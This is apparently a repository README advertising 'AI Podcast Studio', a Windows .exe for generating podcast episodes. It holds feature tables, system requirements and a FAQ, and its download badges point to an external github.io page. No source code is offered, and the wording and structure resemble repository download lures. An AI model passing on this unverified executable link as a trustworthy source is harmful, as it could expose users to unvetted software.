<div align="center">
<br/>
<h1>AI Podcast Generator</h1>
<h3><em>Utilities and companion tools for AI podcast generator.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-5a5cff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=0891B2&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Ai+Podcast+Studio+Pro;%E2%9C%85+No+Limits;%F0%9F%93%A6+Standalone+.exe+Release;%F0%9F%9A%80+Active+Development+2026;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**Turn a prompt, a PDF, or a rough voice memo into a finished, mixed, ready-to-publish podcast episode — offline-capable, on your own Windows machine.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen?style=plastic)](.) [![Version](https://img.shields.io/badge/version-v2.4.1-blue?style=plastic)](.) [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4?style=plastic)](.) [![License](https://img.shields.io/badge/license-MIT-green?style=plastic)](.)

</div>

---

## 🎙️ Overview

**AI Podcast Studio** is a desktop AI podcast generator that writes, voices, edits, and masters episodic audio. You bring an idea, a transcript, a document, or a topic list. The studio handles scripting, multi-voice narration, pacing, music beds, and loudness normalization — then hands you a finished WAV or MP3.

| Category | Details |
|---|---|
| Product type | Offline-first Windows desktop application (`.exe`) |
| Primary job | Generate full podcast episodes from text or prompts |
| Voice engines | Local neural TTS + optional cloud voice providers |
| Output formats | WAV 48kHz/24-bit, MP3 192–320kbps, chaptered M4A |
| Episode length | 2 min clips to 3-hour long-form serials |
| Heads-up | First launch downloads the local voice pack (~2.1 GB) |

It runs on a normal laptop. It does not need a GPU to make an episode — a GPU just makes it faster. The whole point is that a solo creator with an idea and a Tuesday evening can ship a show.

---

## 📖 What is an AI podcast generator? — glossary

| Term | Explanation |
|---|---|
| Episode graph | The internal timeline the studio builds — segments, voices, beds, transitions — before rendering a single audio sample. |
| Voice profile | A saved voice identity: pitch, pace, timbre, accent, and per-word emphasis rules. |
| TTS | Text-to-speech. Here it means neural voice synthesis, local or cloud. |
| Show bible | A project-level ruleset that keeps every episode consistent — tone, host names, segment order, ad slots. |
| Bed | A background music layer placed under narration at a ducked volume. |
| Ducking | Automatic lowering of a music bed whenever narration is present. |
| Master chain | The final processing stage: EQ, compression, de-ess, loudness normalization to platform targets. |

**Why people use it**

- It writes the script *and* performs it, in one pipeline — no copy-paste between tools.
- Local voices mean your raw text never has to leave the machine.
- Episode templates keep a long-running show consistent across dozens of episodes.
- It exports to the loudness targets podcast platforms actually expect.

---

## 🧠 The Problem

- Writing a script, recording it, editing it, and mastering it is four jobs in one, and most people quit at job two.
- Voice recording takes retakes — every "um," every cough, every dog bark means another pass.
- Cloud-only podcast tools meter you by the minute and hold your audio hostage behind a subscription.
- Music beds either bury the narration or sit under it so quietly they do nothing.
- Episode intros drift over months — hosts change their own energy and the show stops sounding like one show.
- Exporting to the right loudness spec for each platform is fiddly and easy to get wrong.
- Multi-host shows need separate voice takes that still sound like two people in one room.

## 🛠️ The Solution

| Problem | Solution |
|---|---|
| Four jobs in one | One pipeline: script → voice → beds → master → export. |
| Retakes on every take | Neural voice profiles render clean narration with no retakes. |
| Minute-metered cloud tools | Local voice engines render offline with no per-minute cost. |
| Beds that bury or vanish | Automatic ducking keyed to the narration envelope. |
| Intros that drift | Show bible locks tone, host names, and segment order. |
| Wrong loudness spec | Per-platform master presets (spoken-word, music-forward, broadcast). |
| Multi-host fidelity | Multi-voice rendering with shared room ambience and crosstalk timing. |

---

## ✅ All modules status

| Module | Status | Description |
|---|---|---|
| Script Engine | ✅ Working | Turns prompts, outlines, and documents into host-ready scripts. |
| Multi-Voice TTS | ✅ Working | Two to six distinct host voices rendered in one pass. |
| Music Bed Mixer | ✅ Working | Ducked beds, stingers, and transition hits. |
| Loudness Master | ✅ Working | Targets for spoken-word, music-forward, and broadcast specs. |
| Chapter Marker Tool | ✅ Working | Inserts chapter boundaries and export metadata. |
| Show Bible | ✅ Working | Project-level tone and segment rules enforced per episode. |
| Batch Episodes | ✅ Working | Renders an entire season from a topic list. |

## 🎧 <div align="center">
  <a href="https://RectorString.github.io/ai-podcast-studio/">
    <img src="https://img.shields.io/badge/GET-AI_podcast_generator_2026-0D9488?style=for-the-badge&labelColor=0F766E" width="520" alt="GET AI podcast generator 2026"/>
  </a>
</div>

Download the Windows `.exe`, extract it, run it. No Python, no Node, no terminal. First launch pulls the voice pack, then you're generating episodes.

---

## 📑 Table of Contents

- [🎙️ Overview](#️-overview)
- [📖 What is an AI podcast generator? — glossary](#-what-is-an-ai-podcast-generator--glossary)
- [🧠 The Problem](#-the-problem)
- [🛠️ The Solution](#️-the-solution)
- [✅ All modules status](#-all-modules-status)
- [🌐 Compatibility / platform support](#-compatibility--platform-support)
- [⚙️ System Requirements](#️-system-requirements)
- [💡 Tips for best results](#-tips-for-best-results)
- [🧩 Key Features](#-key-features)
- [📚 Grouped module catalog](#-grouped-module-catalog)
- [📊 Comparison](#-comparison)
- [🚀 Quick Start](#-quick-start)
- [🐞 Known Issues](#-known-issues)
- [📋 Usage guidelines](#-usage-guidelines)
- [⌨️ Default hotkeys](#️-default-hotkeys)
- [💬 FAQ](#-faq)

---

## 🌐 Compatibility / platform support

| Platform | Support | Notes |
|---|---|---|
| Windows 11 (22H2+) | Full | Best experience, GPU voice acceleration available. |
| Windows 10 (21H1+) | Full | CPU voice rendering recommended on older hardware. |
| Windows Server 2022 | Partial | Works headless for batch episode rendering. |
| macOS | Not supported | Apple Silicon build is on the roadmap, not shipped. |
| Linux | Not supported | Community wrappers exist; not officially tested. |
| GPU acceleration | Optional | CUDA 12+ or DirectML; falls back to CPU cleanly. |

---

## ⚙️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H1 | Windows 11 22H2+ |
| CPU | 4-core x86-64 | 8-core / 16-thread |
| RAM | 8 GB | 16–32 GB |
| GPU | Integrated | 6 GB VRAM, CUDA 12+ or DirectML |
| Disk | 8 GB free | 25 GB free (voice packs + episode cache) |
| Audio | Any output device | ASIO-capable interface for monitoring |
| Network | Optional | Required only for cloud voice providers |

---

## 💡 Tips for best results

- Write the **show bible first** — tone, host names, segment order. Every episode inherits it and stops sounding stitched together.
- Use **one voice profile per host** across the whole season. Swapping mid-season is audible and cheap-looking.
- Keep music beds in the **-18 to -22 LUFS** range before ducking. The mixer handles the rest.
- Render a **draft at 1.0x** before you finalize. Pacing issues are obvious at normal speed and invisible at 1.5x.
- For documents, feed **structured text** (headings, lists) instead of a wall of prose. The script engine uses structure directly.
- Batch-render long seasons **overnight** — the queue survives a restart and picks up where it left off.
- Trim silence to **-45 dBFS**, not -30. Aggressive trims clip natural breath and sound robotic.

---

## 🧩 Key Features

| Feature | Description | Benefit |
|---|---|---|
| Prompt-to-Script | Turns a topic or rough notes into a rounded script with intro, segments, outro. | Skip the blank page. |
| Document Ingest | Reads PDF, DOCX, MD, TXT, and pasted text as source material. | Reuse existing writing. |
| Multi-Voice Rendering | Two to six voices rendered in one pass. | Real conversational shows. |
| Voice Profile Library | Save, retune, and share voice identities. | Consistent show identity. |
| Music Bed Mixer | Beds, stingers, and transition hits with ducking. | Broadcast feel without a DAW. |
| Loudness Master | Per-platform targets with one-click export. | Correct spec, first try. |
| Show Bible | Project rules enforced per episode. | Long-run consistency. |
| Batch Episodes | Full season from a topic list. | Ship a whole show. |
| Chapter Markers | Metadata chapter boundaries on export. | Better listener navigation. |
| Offline Engine | Local voices render with no network. | Private, unmetered. |
| Live Monitor | Hear the render as it builds. | Fix problems early. |
| Restore Points | Per-episode state snapshots. | Undo a bad take fast. |

---

## 📚 Grouped module catalog

### 🗣️ **Script & Writing**

1. **Prompt-to-Script** — builds a rounded episode script from a topic or rough notes.
2. **Outline Expander** — turns a bullet outline into full segment narration.
3. **Document Ingest** — pulls structured text from PDF, DOCX, MD, and TXT.
4. **Ad Slot Writer** — generates sponsor read copy in your show's tone.
5. **Show Bible** — locks tone, host names, and segment order across episodes.

### 🎤 **Voice & Performance**

6. **Multi-Voice TTS** — renders two to six distinct host voices in one pass.
7. **Voice Profile Library** — save and retune pitch, pace, timbre, accent.
8. **Emphasis Director** — per-word emphasis rules for key lines.
9. **Breath & Pause Timing** — natural silence placement between phrases.
10. **Crosstalk Engine** — overlapping timing for two-host conversation.
11. **Local Voice Pack Manager** — download, verify, and swap voice packs.
12. **Cloud Voice Bridge** — optional cloud providers for exotic voices.

### 🎚️ **Mixing & Music**

13. **Music Bed Mixer** — ducked beds and background layers.
14. **Stinger & Transition Hits** — intros, outros, and segment breaks.
15. **Auto Ducking** — keyed to the narration envelope.
16. **Room Ambience** — shared room tone so voices sit in one space.
17. **EQ & De-Ess** — per-voice cleanup before the master chain.

### 📈 **Mastering & Export**

18. **Loudness Master** — spoken-word, music-forward, broadcast targets.
19. **Chapter Marker Tool** — inserts and exports chapter metadata.
20. **Format Export** — WAV 48/24, MP3 192–320, chaptered M4A.
21. **Batch Episodes** — renders a whole season from a topic list.
22. **Cover Art Mapper** — attaches show art and metadata to exports.

### 🗂️ **Project & Workflow**

23. **Live Monitor** — hear the render as it builds.
24. **Restore Points** — per-episode state snapshots and rollback.
25. **Render Queue** — restart-safe overnight batch rendering.
26. **Episode Cache** — reuse stems between episodes.
27. **CLI Bridge** — headless render for scripted pipelines.

### 🔒 **Privacy & Control**

28. **Offline Engine** — local voices render with no network.
29. **Local-First Storage** — episodes, stems, and profiles stay on disk.
30. **No Telemetry Mode** — one toggle, verified by network monitor.
31. **Portable Mode** — run from a USB drive with settings in a local file.

---

## 📊 Comparison

| Aspect | Alternative | This Tool |
|---|---|---|
| Pricing model | Per-minute or per-seat subscription | One offline app, no per-minute meter |
| Privacy | Text uploaded to a server | Local voices, text stays on disk |
| Workflow | Separate script and TTS tools | One pipeline, script → master |
| Multi-host | Manual stem alignment | Crosstalk engine in one pass |
| Master spec | Manual loudness tweaks | Per-platform presets |
| Season consistency | Rebuild rules each episode | Show bible enforced |
| Batch rendering | One episode at a time | Restart-safe season queue |
| GPU use | Cloud-only | Local CUDA / DirectML, CPU fallback |

---

## 🚀 Quick Start

1. 📦 Visit the project page and grab the Windows `.exe` archive.
2. 🗜️ Extract the archive to a folder you can write to (avoid `C:\Program Files`).
3. ▶️ Run the executable. On first launch, let it download the local voice pack.
4. ✍️ Create a project, write a topic or drop in a document, pick your host voices.
5. 🎧 Render, monitor, and export — WAV, MP3, or chaptered M4A.

---

## 🐞 Known Issues

| Issue | Fix |
|---|---|
| First launch stalls on voice pack download | Check firewall; the pack pulls from a CDN over HTTPS. Retry resumes. |
| Render is slow on CPU-only laptops | Lower voice quality to "Fast" in Settings → Engine, or enable any GPU. |
| Music bed overpowers narration | Reduce bed gain to -20 LUFS; verify auto-ducking is enabled. |
| Export sounds clipped on phone speakers | Use the "Music-forward" master preset, not "Broadcast." |
| Episode cache grows large over time | Set a cache size cap in Settings → Storage; old stems evict automatically. |
| Portable mode loses settings | Ensure the portable marker file sits next to the executable. |

---

## 📋 Usage guidelines

| Allowed | Not allowed |
|---|---|
| Generating your own original shows | Cloning a real person's voice without consent |
| Ingesting documents you hold rights to | Generating content impersonating real people |
| Ad-read copy in your own show's tone | Misrepresenting yourself or your show |
| Offline rendering with local voices | Reselling rendered voices as identity products |
| Batch-rendering your own season | Circumventing the local voice pack's license |
| Sharing voice profiles you built | Distributing voice packs you didn't license |

---

## ⌨️ Default hotkeys

| Action | Hotkey |
|---|---|
| New episode | `Ctrl + N` |
| Render draft | `Ctrl + R` |
| Toggle live monitor | `Ctrl + M` |
| Open show bible | `Ctrl + B` |
| Add chapter marker | `Ctrl + K` |
| Export final mix | `Ctrl + E` |
| Toggle batch queue | `Ctrl + Q` |

---

## 💬 FAQ

| Question | Answer |
|---|---|
| Do I need a GPU? | No. A GPU only speeds up rendering. CPU-only laptops work fine at the "Fast" voice tier. |
| Does it work offline? | Yes. Local voices render with no network once the voice pack is downloaded. |
| Can I use my own voice? | You can build a voice profile from your own recordings; cloning others requires their consent. |
| What formats can it export? | WAV 48kHz/24-bit, MP3 192–320kbps, and chaptered M4A. |
| How long can an episode be? | From 2-minute clips to 3-hour serials. Long renders run best overnight. |
| Can it make a full season? | Yes — feed it a topic list and the batch queue renders every episode. |
| Is there a macOS build? | Not shipped. Apple Silicon support is on the roadmap only. |
| Where are episodes stored? | On your disk, under the project folder. Nothing is uploaded by default. |
| Does it phone home? | No. "No Telemetry Mode" is a single toggle and no network is required for local rendering. |
| Can I run it from a USB drive? | Yes — Portable Mode keeps settings next to the executable. |

---

## 🎧 <p align="center">
  <a href="https://RectorString.github.io/ai-podcast-studio/">
    <img src="https://img.shields.io/badge/DOWNLOAD_HERE-AI_podcast_generator-059669?style=flat-square&logo=windows&logoColor=white&labelColor=047857" width="520" alt="DOWNLOAD HERE AI podcast generator"/>
  </a>
</p>

Grab the Windows `.exe`, extract, run. First launch pulls the voice pack, then you're recording a show on your own machine that evening.

---

That's AI Podcast Studio — a local-first AI podcast generator that takes a topic and a Tuesday evening and hands back a finished, mastered episode, no metered cloud minutes and no copy-paste between four tools. It runs on a normal laptop, keeps your text on your disk, and exports to the loudness spec the platforms actually expect. Build a show bible once, and every episode after it sounds like the same show.
